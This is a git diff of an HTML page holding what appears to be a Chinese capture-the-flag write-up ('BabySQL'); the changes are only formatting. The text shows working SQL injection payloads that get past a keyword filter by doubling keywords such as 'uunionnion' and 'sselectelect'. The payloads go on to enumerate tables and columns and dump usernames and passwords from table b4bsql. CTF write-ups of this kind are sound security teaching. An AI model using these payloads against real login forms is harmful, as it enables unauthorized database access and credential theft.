@@ -19,12 +19,12 @@
   <meta name="author" content="野草">
   <meta name="keywords" content="野草">
   
-    <meta name="description" content="sql注入,关键字过滤  尝试万能密码，尝试失败，发现or被过滤了。 关键字被过滤，使用双写进行注入。pyload:?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion sselectelect 1,2%23 行数错误，继续构造payload?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion sselectelec">
+    <meta name="description" content="sql注入,关键字过滤  尝试万能密码，尝试失败，发现or被过滤了。  关键字被过滤，使用双写进行注入。pyload:?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion sselectelect 1,2%23 行数错误，继续构造payload?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion ssele">
 <meta property="og:type" content="website">
 <meta property="og:title" content="BabySQL">
 <meta property="og:url" content="https://ycqaq233.github.io/WriteUp/Web/BabySQL.html">
 <meta property="og:site_name" content="野草">
-<meta property="og:description" content="sql注入,关键字过滤  尝试万能密码，尝试失败，发现or被过滤了。 关键字被过滤，使用双写进行注入。pyload:?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion sselectelect 1,2%23 行数错误，继续构造payload?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion sselectelec">
+<meta property="og:description" content="sql注入,关键字过滤  尝试万能密码，尝试失败，发现or被过滤了。  关键字被过滤，使用双写进行注入。pyload:?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion sselectelect 1,2%23 行数错误，继续构造payload?username&#x3D;admin&amp;password&#x3D;admin&#39; uunionnion ssele">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/baby2.png">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/baby3.png">
@@ -233,19 +233,19 @@
   <blockquote>
 <p>sql注入,关键字过滤</p>
 </blockquote>
-<p>尝试万能密码，尝试失败，发现or被过滤了。<img src="img/baby2.png" srcset="/img/loading.gif" lazyload alt><br>
-关键字被过滤，使用双写进行注入。pyload:<code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2%23</code><br>
-行数错误，继续构造payload<code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,3%23</code><br>
-<img src="img/baby3.png" srcset="/img/loading.gif" lazyload alt><br>
-这次注入成功，有回显。<img src="img/baby4.png" srcset="/img/loading.gif" lazyload alt><br>
-构造payload:<code>/check.php?username=admin&amp;password=1' uunionnion sselectelect 1,database(),version()%23</code>得到了数据库名称和版本。<img src="img/baby5.png" srcset="/img/loading.gif" lazyload alt><br>
-构造以下payload:<code>1' ununionion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()%23</code><br>
-构造成功,得到表名<img src="img/baby6.png" srcset="/img/loading.gif" lazyload alt><br>
-构造payload爆表:<code>1' ununionion sselectelect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_schema=database() aandnd table_name='geekuser'%23</code><br>
-<img src="img/baby7.png" srcset="/img/loading.gif" lazyload alt><br>
-构造payload爆字段，发现爆错数据库了，换一下数据库名称<code>1' ununionion seselectlect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23</code><br>
-成功<br>
-<img src="img/baby8.png" srcset="/img/loading.gif" lazyload alt></p>
+<p>尝试万能密码，尝试失败，发现or被过滤了。 <img src="img/baby2.png" srcset="/img/loading.gif" lazyload>
+关键字被过滤，使用双写进行注入。pyload:<code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2%23</code>
+行数错误，继续构造payload<code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,3%23</code>
+<img src="img/baby3.png" srcset="/img/loading.gif" lazyload> 这次注入成功，有回显。 <img src="img/baby4.png" srcset="/img/loading.gif" lazyload>
+构造payload:<code>/check.php?username=admin&amp;password=1' uunionnion sselectelect 1,database(),version()%23</code>得到了数据库名称和版本。
+<img src="img/baby5.png" srcset="/img/loading.gif" lazyload>
+构造以下payload:<code>1' ununionion sselectelect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()%23</code>
+构造成功,得到表名 <img src="img/baby6.png" srcset="/img/loading.gif" lazyload>
+构造payload爆表:<code>1' ununionion sselectelect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_schema=database() aandnd table_name='geekuser'%23</code>
+<img src="img/baby7.png" srcset="/img/loading.gif" lazyload>
+构造payload爆字段，发现爆错数据库了，换一下数据库名称
+<code>1' ununionion seselectlect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23</code>
+成功 <img src="img/baby8.png" srcset="/img/loading.gif" lazyload></p>
 
 
   
